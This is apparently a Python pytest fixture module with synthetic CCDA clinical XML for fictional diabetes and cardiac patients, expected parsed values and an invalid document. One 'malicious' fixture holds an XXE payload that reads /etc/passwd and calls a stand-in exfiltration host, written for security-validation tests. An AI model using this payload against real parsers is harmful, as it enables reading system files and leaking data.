"""
CCDA Test Data for Comprehensive Clinical Scenarios

This module contains realistic CCDA XML test data for validating CCDA parsing
and transformation functionality. All test data represents authentic clinical
scenarios with safety-critical medication and lab data that must be preserved exactly.

All test data is de-identified and represents realistic but fictional patients.
"""

from typing import Dict, Any, List
import pytest
from datetime import datetime, timedelta


class CCDATestDataFactory:
    """
    Factory class for generating realistic CCDA XML test data.
    
    All generated data follows CCDA R2.1 standards and represents
    authentic clinical scenarios with safety-critical preservation requirements.
    """
    
    @staticmethod
    def create_diabetes_ccda_document() -> str:
        """
        Create comprehensive diabetes CCDA document.
        
        Patient: 55-year-old Type 2 diabetic with medications and lab results
        - Multiple diabetes medications requiring exact preservation
        - HbA1c and glucose lab results with reference ranges
        - Vital signs with exact measurements
        """
        return """<?xml version="1.0" encoding="UTF-8"?>
<ClinicalDocument xmlns="urn:hl7-org:v3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <typeId root="2.16.840.1.113883.1.3" extension="POCD_HD000040"/>
  <templateId root="2.16.840.1.113883.10.20.22.1.1" extension="2015-08-01"/>
  <id extension="CCDA-DIABETES-001" root="1.2.3.4.5.6.7.8"/>
  <code code="34133-9" codeSystem="2.16.840.1.113883.6.1" displayName="Summarization of Episode Note"/>
  <title>Diabetes Management Summary</title>
  <effectiveTime value="20240201120000"/>
  <confidentialityCode code="N" codeSystem="2.16.840.1.113883.5.25"/>
  <languageCode code="en-US"/>
  
  <recordTarget>
    <patientRole>
      <id extension="DIAB-PATIENT-001" root="1.2.3.4.5"/>
      <patient>
        <name>
          <given>Maria</given>
          <family>DiabetesPatient</family>
        </name>
        <administrativeGenderCode code="F" codeSystem="2.16.840.1.113883.5.1"/>
        <birthTime value="19690315"/>
      </patient>
    </patientRole>
  </recordTarget>
  
  <author>
    <time value="20240201120000"/>
    <assignedAuthor>
      <id root="1.2.3.4.5"/>
      <assignedPerson>
        <name>
          <given>Sarah</given>
          <family>Johnson</family>
          <suffix>MD</suffix>
        </name>
      </assignedPerson>
    </assignedAuthor>
  </author>
  
  <component>
    <structuredBody>
      
      <!-- MEDICATIONS SECTION - CRITICAL PRESERVATION REQUIRED -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.1.1"/>
          <code code="10160-0" codeSystem="2.16.840.1.113883.6.1" displayName="MEDICATIONS"/>
          <title>MEDICATIONS</title>
          <text>Current diabetes medications requiring exact dosage preservation</text>
          
          <!-- Metformin 500mg twice daily -->
          <entry>
            <substanceAdministration classCode="SBADM" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.16"/>
              <id root="1.2.3.4.5.6.7" extension="MED-METFORMIN-001"/>
              <statusCode code="active"/>
              <effectiveTime xsi:type="IVL_TS">
                <low value="20240115"/>
                <high nullFlavor="NI"/>
              </effectiveTime>
              <effectiveTime xsi:type="PIVL_TS" institutionSpecified="true">
                <period value="12" unit="h"/>
              </effectiveTime>
              <routeCode code="PO" codeSystem="2.16.840.1.113883.3.26.1.1" displayName="Oral"/>
              <doseQuantity value="1" unit="TAB"/>
              <consumable>
                <manufacturedProduct>
                  <templateId root="2.16.840.1.113883.10.20.22.4.23"/>
                  <manufacturedMaterial>
                    <code code="197804" codeSystem="2.16.840.1.113883.6.88" displayName="Metformin Hydrochloride 500 MG Oral Tablet"/>
                    <name>Metformin 500mg tablets</name>
                  </manufacturedMaterial>
                </manufacturedProduct>
              </consumable>
            </substanceAdministration>
          </entry>
          
          <!-- Insulin Glargine 28 units daily -->
          <entry>
            <substanceAdministration classCode="SBADM" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.16"/>
              <id root="1.2.3.4.5.6.7" extension="MED-INSULIN-GLARGINE-001"/>
              <statusCode code="active"/>
              <effectiveTime xsi:type="IVL_TS">
                <low value="20240115"/>
                <high nullFlavor="NI"/>
              </effectiveTime>
              <effectiveTime xsi:type="PIVL_TS" institutionSpecified="true">
                <period value="24" unit="h"/>
              </effectiveTime>
              <routeCode code="SC" codeSystem="2.16.840.1.113883.3.26.1.1" displayName="Subcutaneous"/>
              <doseQuantity value="28" unit="U"/>
              <consumable>
                <manufacturedProduct>
                  <templateId root="2.16.840.1.113883.10.20.22.4.23"/>
                  <manufacturedMaterial>
                    <code code="274783" codeSystem="2.16.840.1.113883.6.88" displayName="Insulin Glargine 100 unit/mL Pen Injector"/>
                    <name>Lantus (insulin glargine) 100 units/mL pen</name>
                  </manufacturedMaterial>
                </manufacturedProduct>
              </consumable>
            </substanceAdministration>
          </entry>
          
          <!-- Lisinopril 10mg daily -->
          <entry>
            <substanceAdministration classCode="SBADM" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.16"/>
              <id root="1.2.3.4.5.6.7" extension="MED-LISINOPRIL-001"/>
              <statusCode code="active"/>
              <effectiveTime xsi:type="IVL_TS">
                <low value="20240115"/>
                <high nullFlavor="NI"/>
              </effectiveTime>
              <effectiveTime xsi:type="PIVL_TS" institutionSpecified="true">
                <period value="24" unit="h"/>
              </effectiveTime>
              <routeCode code="PO" codeSystem="2.16.840.1.113883.3.26.1.1" displayName="Oral"/>
              <doseQuantity value="1" unit="TAB"/>
              <consumable>
                <manufacturedProduct>
                  <templateId root="2.16.840.1.113883.10.20.22.4.23"/>
                  <manufacturedMaterial>
                    <code code="197361" codeSystem="2.16.840.1.113883.6.88" displayName="Lisinopril 10 MG Oral Tablet"/>
                    <name>Lisinopril 10mg tablets</name>
                  </manufacturedMaterial>
                </manufacturedProduct>
              </consumable>
            </substanceAdministration>
          </entry>
          
        </section>
      </component>
      
      <!-- LAB RESULTS SECTION - CRITICAL PRESERVATION REQUIRED -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.3.1"/>
          <code code="30954-2" codeSystem="2.16.840.1.113883.6.1" displayName="RESULTS"/>
          <title>LABORATORY RESULTS</title>
          <text>Recent diabetes monitoring lab results</text>
          
          <!-- HbA1c Result -->
          <entry>
            <organizer classCode="BATTERY" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.1"/>
              <id root="1.2.3.4.5.6" extension="LAB-BATTERY-HBA1C-001"/>
              <code code="4548-4" codeSystem="2.16.840.1.113883.6.1" displayName="Hemoglobin A1c"/>
              <statusCode code="completed"/>
              <effectiveTime value="20240125080000"/>
              
              <component>
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.2"/>
                  <id root="1.2.3.4.5.6" extension="LAB-HBA1C-001"/>
                  <code code="4548-4" codeSystem="2.16.840.1.113883.6.1" displayName="Hemoglobin A1c"/>
                  <statusCode code="completed"/>
                  <effectiveTime value="20240125080000"/>
                  <value xsi:type="PQ" value="7.2" unit="%"/>
                  <interpretationCode code="H" codeSystem="2.16.840.1.113883.5.83" displayName="High"/>
                  <referenceRange>
                    <observationRange>
                      <text>Goal: less than 7.0%</text>
                    </observationRange>
                  </referenceRange>
                </observation>
              </component>
            </organizer>
          </entry>
          
          <!-- Fasting Glucose Result -->
          <entry>
            <organizer classCode="BATTERY" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.1"/>
              <id root="1.2.3.4.5.6" extension="LAB-BATTERY-GLUCOSE-001"/>
              <code code="1558-6" codeSystem="2.16.840.1.113883.6.1" displayName="Fasting glucose"/>
              <statusCode code="completed"/>
              <effectiveTime value="20240125080000"/>
              
              <component>
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.2"/>
                  <id root="1.2.3.4.5.6" extension="LAB-GLUCOSE-001"/>
                  <code code="1558-6" codeSystem="2.16.840.1.113883.6.1" displayName="Fasting glucose"/>
                  <statusCode code="completed"/>
                  <effectiveTime value="20240125080000"/>
                  <value xsi:type="PQ" value="142" unit="mg/dL"/>
                  <interpretationCode code="H" codeSystem="2.16.840.1.113883.5.83" displayName="High"/>
                  <referenceRange>
                    <observationRange>
                      <text>Normal: 70-100 mg/dL</text>
                    </observationRange>
                  </referenceRange>
                </observation>
              </component>
            </organizer>
          </entry>
          
        </section>
      </component>
      
      <!-- VITAL SIGNS SECTION - CRITICAL PRESERVATION REQUIRED -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.4.1"/>
          <code code="8716-3" codeSystem="2.16.840.1.113883.6.1" displayName="VITAL SIGNS"/>
          <title>VITAL SIGNS</title>
          <text>Recent vital signs measurements</text>
          
          <!-- Blood Pressure -->
          <entry>
            <organizer classCode="CLUSTER" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.26"/>
              <id root="1.2.3.4.5.6" extension="VITALS-BP-001"/>
              <code code="46680005" codeSystem="2.16.840.1.113883.6.96" displayName="Vital signs"/>
              <statusCode code="completed"/>
              <effectiveTime value="20240201110000"/>
              
              <!-- Systolic BP -->
              <component>
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.27"/>
                  <id root="1.2.3.4.5.6" extension="VITALS-SBP-001"/>
                  <code code="8480-6" codeSystem="2.16.840.1.113883.6.1" displayName="Systolic blood pressure"/>
                  <statusCode code="completed"/>
                  <effectiveTime value="20240201110000"/>
                  <value xsi:type="PQ" value="138" unit="mm[Hg]"/>
                </observation>
              </component>
              
              <!-- Diastolic BP -->
              <component>
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.27"/>
                  <id root="1.2.3.4.5.6" extension="VITALS-DBP-001"/>
                  <code code="8462-4" codeSystem="2.16.840.1.113883.6.1" displayName="Diastolic blood pressure"/>
                  <statusCode code="completed"/>
                  <effectiveTime value="20240201110000"/>
                  <value xsi:type="PQ" value="82" unit="mm[Hg]"/>
                </observation>
              </component>
              
            </organizer>
          </entry>
          
          <!-- Weight -->
          <entry>
            <observation classCode="OBS" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.27"/>
              <id root="1.2.3.4.5.6" extension="VITALS-WEIGHT-001"/>
              <code code="29463-7" codeSystem="2.16.840.1.113883.6.1" displayName="Body weight"/>
              <statusCode code="completed"/>
              <effectiveTime value="20240201110000"/>
              <value xsi:type="PQ" value="78.2" unit="kg"/>
            </observation>
          </entry>
          
        </section>
      </component>
      
      <!-- ALLERGIES SECTION - CRITICAL PRESERVATION REQUIRED -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.6.1"/>
          <code code="48765-2" codeSystem="2.16.840.1.113883.6.1" displayName="ALLERGIES"/>
          <title>ALLERGIES AND ADVERSE REACTIONS</title>
          <text>Known drug allergies requiring exact preservation</text>
          
          <!-- Penicillin Allergy -->
          <entry>
            <act classCode="ACT" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.30"/>
              <id root="1.2.3.4.5.6" extension="ALLERGY-PENICILLIN-001"/>
              <code code="CONC" codeSystem="2.16.840.1.113883.5.6"/>
              <statusCode code="active"/>
              <effectiveTime>
                <low value="19950601"/>
              </effectiveTime>
              
              <entryRelationship typeCode="SUBJ">
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.7"/>
                  <id root="1.2.3.4.5.6" extension="ALLERGY-OBS-PENICILLIN-001"/>
                  <code code="ASSERTION" codeSystem="2.16.840.1.113883.5.4"/>
                  <statusCode code="completed"/>
                  <value xsi:type="CD" code="416098002" codeSystem="2.16.840.1.113883.6.96" displayName="Drug allergy"/>
                  <participant typeCode="CSM">
                    <participantRole classCode="MANU">
                      <playingEntity classCode="MMAT">
                        <code code="70618" codeSystem="2.16.840.1.113883.6.88" displayName="Penicillin"/>
                        <name>Penicillin</name>
                      </playingEntity>
                    </participantRole>
                  </participant>
                  
                  <!-- Reaction Severity -->
                  <entryRelationship typeCode="MFST">
                    <observation classCode="OBS" moodCode="EVN">
                      <templateId root="2.16.840.1.113883.10.20.22.4.9"/>
                      <id root="1.2.3.4.5.6" extension="ALLERGY-REACTION-001"/>
                      <code code="SEV" codeSystem="2.16.840.1.113883.5.4" displayName="Severity"/>
                      <statusCode code="completed"/>
                      <value xsi:type="CD" code="24484000" codeSystem="2.16.840.1.113883.6.96" displayName="Severe"/>
                    </observation>
                  </entryRelationship>
                  
                </observation>
              </entryRelationship>
            </act>
          </entry>
          
        </section>
      </component>
      
      <!-- ASSESSMENT AND PLAN SECTION - AI ENHANCEMENT ALLOWED -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.9"/>
          <code code="51847-2" codeSystem="2.16.840.1.113883.6.1" displayName="ASSESSMENT AND PLAN"/>
          <title>ASSESSMENT AND PLAN</title>
          <text>
            Patient presents with type 2 diabetes mellitus with suboptimal glycemic control. 
            Current HbA1c of 7.2% indicates need for medication adjustment. Blood pressure 
            remains elevated despite ACE inhibitor therapy. Continue current metformin and 
            insulin regimen with close monitoring. Consider increasing insulin glargine 
            dose by 2-4 units if fasting glucose remains elevated. Follow up in 3 months 
            with repeat HbA1c and comprehensive metabolic panel. Patient counseled on 
            importance of dietary compliance and regular exercise.
          </text>
        </section>
      </component>
      
    </structuredBody>
  </component>
</ClinicalDocument>"""

    @staticmethod
    def create_cardiac_ccda_document() -> str:
        """
        Create cardiac patient CCDA document.
        
        Patient: 68-year-old with heart failure and atrial fibrillation
        - Critical cardiac medications with narrow therapeutic windows
        - Lab results for monitoring drug levels and organ function
        """
        return """<?xml version="1.0" encoding="UTF-8"?>
<ClinicalDocument xmlns="urn:hl7-org:v3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <typeId root="2.16.840.1.113883.1.3" extension="POCD_HD000040"/>
  <templateId root="2.16.840.1.113883.10.20.22.1.1" extension="2015-08-01"/>
  <id extension="CCDA-CARDIAC-001" root="1.2.3.4.5.6.7.8"/>
  <code code="34133-9" codeSystem="2.16.840.1.113883.6.1" displayName="Summarization of Episode Note"/>
  <title>Cardiac Care Summary</title>
  <effectiveTime value="20240205140000"/>
  
  <recordTarget>
    <patientRole>
      <id extension="CARDIAC-PATIENT-001" root="1.2.3.4.5"/>
      <patient>
        <name>
          <given>Robert</given>
          <family>CardiacPatient</family>
        </name>
        <administrativeGenderCode code="M" codeSystem="2.16.840.1.113883.5.1"/>
        <birthTime value="19551120"/>
      </patient>
    </patientRole>
  </recordTarget>
  
  <component>
    <structuredBody>
      
      <!-- MEDICATIONS SECTION -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.1.1"/>
          <code code="10160-0" codeSystem="2.16.840.1.113883.6.1" displayName="MEDICATIONS"/>
          <title>MEDICATIONS</title>
          <text>Cardiac medications requiring exact dosage preservation</text>
          
          <!-- Digoxin 0.125mg daily -->
          <entry>
            <substanceAdministration classCode="SBADM" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.16"/>
              <id root="1.2.3.4.5.6.7" extension="MED-DIGOXIN-001"/>
              <statusCode code="active"/>
              <effectiveTime xsi:type="PIVL_TS" institutionSpecified="true">
                <period value="24" unit="h"/>
              </effectiveTime>
              <routeCode code="PO" codeSystem="2.16.840.1.113883.3.26.1.1" displayName="Oral"/>
              <doseQuantity value="0.125" unit="mg"/>
              <consumable>
                <manufacturedProduct>
                  <templateId root="2.16.840.1.113883.10.20.22.4.23"/>
                  <manufacturedMaterial>
                    <code code="197604" codeSystem="2.16.840.1.113883.6.88" displayName="Digoxin 0.125 MG Oral Tablet"/>
                    <name>Digoxin 0.125mg (125 mcg) tablets</name>
                  </manufacturedMaterial>
                </manufacturedProduct>
              </consumable>
            </substanceAdministration>
          </entry>
          
          <!-- Warfarin 2.5mg daily -->
          <entry>
            <substanceAdministration classCode="SBADM" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.16"/>
              <id root="1.2.3.4.5.6.7" extension="MED-WARFARIN-001"/>
              <statusCode code="active"/>
              <effectiveTime xsi:type="PIVL_TS" institutionSpecified="true">
                <period value="24" unit="h"/>
              </effectiveTime>
              <routeCode code="PO" codeSystem="2.16.840.1.113883.3.26.1.1" displayName="Oral"/>
              <doseQuantity value="2.5" unit="mg"/>
              <consumable>
                <manufacturedProduct>
                  <templateId root="2.16.840.1.113883.10.20.22.4.23"/>
                  <manufacturedMaterial>
                    <code code="855332" codeSystem="2.16.840.1.113883.6.88" displayName="Warfarin Sodium 2.5 MG Oral Tablet"/>
                    <name>Warfarin sodium 2.5mg tablets</name>
                  </manufacturedMaterial>
                </manufacturedProduct>
              </consumable>
            </substanceAdministration>
          </entry>
          
        </section>
      </component>
      
      <!-- LAB RESULTS SECTION -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.3.1"/>
          <code code="30954-2" codeSystem="2.16.840.1.113883.6.1" displayName="RESULTS"/>
          <title>LABORATORY RESULTS</title>
          <text>Cardiac medication monitoring lab results</text>
          
          <!-- INR Result for Warfarin Monitoring -->
          <entry>
            <organizer classCode="BATTERY" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.1"/>
              <id root="1.2.3.4.5.6" extension="LAB-BATTERY-INR-001"/>
              <code code="6301-6" codeSystem="2.16.840.1.113883.6.1" displayName="INR"/>
              <statusCode code="completed"/>
              <effectiveTime value="20240202080000"/>
              
              <component>
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.2"/>
                  <id root="1.2.3.4.5.6" extension="LAB-INR-001"/>
                  <code code="6301-6" codeSystem="2.16.840.1.113883.6.1" displayName="INR"/>
                  <statusCode code="completed"/>
                  <effectiveTime value="20240202080000"/>
                  <value xsi:type="PQ" value="2.3" unit="1"/>
                  <interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83" displayName="Normal"/>
                  <referenceRange>
                    <observationRange>
                      <text>Target range: 2.0-3.0</text>
                    </observationRange>
                  </referenceRange>
                </observation>
              </component>
            </organizer>
          </entry>
          
          <!-- Digoxin Level -->
          <entry>
            <organizer classCode="BATTERY" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.1"/>
              <id root="1.2.3.4.5.6" extension="LAB-BATTERY-DIGOXIN-001"/>
              <code code="10535-3" codeSystem="2.16.840.1.113883.6.1" displayName="Digoxin"/>
              <statusCode code="completed"/>
              <effectiveTime value="20240202080000"/>
              
              <component>
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.2"/>
                  <id root="1.2.3.4.5.6" extension="LAB-DIGOXIN-001"/>
                  <code code="10535-3" codeSystem="2.16.840.1.113883.6.1" displayName="Digoxin"/>
                  <statusCode code="completed"/>
                  <effectiveTime value="20240202080000"/>
                  <value xsi:type="PQ" value="1.2" unit="ng/mL"/>
                  <interpretationCode code="N" codeSystem="2.16.840.1.113883.5.83" displayName="Normal"/>
                  <referenceRange>
                    <observationRange>
                      <text>Therapeutic range: 0.8-2.0 ng/mL</text>
                    </observationRange>
                  </referenceRange>
                </observation>
              </component>
            </organizer>
          </entry>
          
        </section>
      </component>
      
    </structuredBody>
  </component>
</ClinicalDocument>"""

    @staticmethod  
    def create_malicious_ccda_document() -> str:
        """
        Create CCDA document with potential security threats for testing.
        
        This document contains various XML security threats that should be
        detected and blocked by the security validation.
        """
        return """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ClinicalDocument [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://malicious-site.com/steal-data">
]>
<ClinicalDocument xmlns="urn:hl7-org:v3">
  <id extension="MALICIOUS-001" root="1.2.3.4.5"/>
  <code code="34133-9" displayName="Test Document"/>
  <title>Malicious Test Document &xxe;</title>
  <component>
    <structuredBody>
      <component>
        <section>
          <title>Test Section</title>
          <text>Attempting to access: &xxe2;</text>
        </section>
      </component>
    </structuredBody>
  </component>
</ClinicalDocument>"""

    @staticmethod
    def create_invalid_ccda_document() -> str:
        """
        Create invalid CCDA document for validation testing.
        
        This document has structural issues that should be caught
        by CCDA validation routines.
        """
        return """<?xml version="1.0" encoding="UTF-8"?>
<InvalidDocument xmlns="urn:invalid">
  <wrongElement>This is not a valid CCDA document</wrongElement>
</InvalidDocument>"""

    @staticmethod
    def get_expected_diabetes_medications() -> List[Dict[str, Any]]:
        """Expected medication data from diabetes CCDA parsing."""
        return [
            {
                "substance_name": "Metformin Hydrochloride 500 MG Oral Tablet",
                "dosage_amount": "1",
                "dosage_unit": "TAB",
                "frequency": "Every 12 h",
                "route": "Oral",
                "status": "active"
            },
            {
                "substance_name": "Insulin Glargine 100 unit/mL Pen Injector",
                "dosage_amount": "28",
                "dosage_unit": "U",
                "frequency": "Every 24 h",
                "route": "Subcutaneous",
                "status": "active"
            },
            {
                "substance_name": "Lisinopril 10 MG Oral Tablet",
                "dosage_amount": "1",
                "dosage_unit": "TAB",
                "frequency": "Every 24 h",
                "route": "Oral",
                "status": "active"
            }
        ]

    @staticmethod
    def get_expected_diabetes_labs() -> List[Dict[str, Any]]:
        """Expected lab result data from diabetes CCDA parsing."""
        return [
            {
                "test_name": "Hemoglobin A1c",
                "test_code": "4548-4",
                "value": "7.2",
                "unit": "%",
                "interpretation": "H",
                "reference_range": "Goal: less than 7.0%"
            },
            {
                "test_name": "Fasting glucose",
                "test_code": "1558-6",
                "value": "142",
                "unit": "mg/dL",
                "interpretation": "H",
                "reference_range": "Normal: 70-100 mg/dL"
            }
        ]

    @staticmethod
    def get_expected_diabetes_vitals() -> List[Dict[str, Any]]:
        """Expected vital signs data from diabetes CCDA parsing."""
        return [
            {
                "vital_name": "Systolic blood pressure",
                "vital_code": "8480-6",
                "value": "138",
                "unit": "mm[Hg]",
                "measurement_time": "20240201110000"
            },
            {
                "vital_name": "Diastolic blood pressure",
                "vital_code": "8462-4",
                "value": "82",
                "unit": "mm[Hg]",
                "measurement_time": "20240201110000"
            },
            {
                "vital_name": "Body weight",
                "vital_code": "29463-7",
                "value": "78.2",
                "unit": "kg",
                "measurement_time": "20240201110000"
            }
        ]

    @staticmethod
    def get_expected_diabetes_allergies() -> List[Dict[str, Any]]:
        """Expected allergy data from diabetes CCDA parsing."""
        return [
            {
                "allergen": "Penicillin",
                "severity": "Severe"
            }
        ]


@pytest.fixture
def diabetes_ccda_document():
    """Fixture for diabetes CCDA document."""
    return CCDATestDataFactory.create_diabetes_ccda_document()


@pytest.fixture
def cardiac_ccda_document():
    """Fixture for cardiac CCDA document."""
    return CCDATestDataFactory.create_cardiac_ccda_document()


@pytest.fixture
def malicious_ccda_document():
    """Fixture for malicious CCDA document (for security testing)."""
    return CCDATestDataFactory.create_malicious_ccda_document()


@pytest.fixture
def invalid_ccda_document():
    """Fixture for invalid CCDA document (for validation testing)."""
    return CCDATestDataFactory.create_invalid_ccda_document()


@pytest.fixture
def expected_diabetes_medications():
    """Fixture for expected diabetes medication data."""
    return CCDATestDataFactory.get_expected_diabetes_medications()


@pytest.fixture
def expected_diabetes_labs():
    """Fixture for expected diabetes lab data."""
    return CCDATestDataFactory.get_expected_diabetes_labs()


@pytest.fixture
def expected_diabetes_vitals():
    """Fixture for expected diabetes vital signs data."""
    return CCDATestDataFactory.get_expected_diabetes_vitals()


@pytest.fixture
def expected_diabetes_allergies():
    """Fixture for expected diabetes allergy data."""
    return CCDATestDataFactory.get_expected_diabetes_allergies()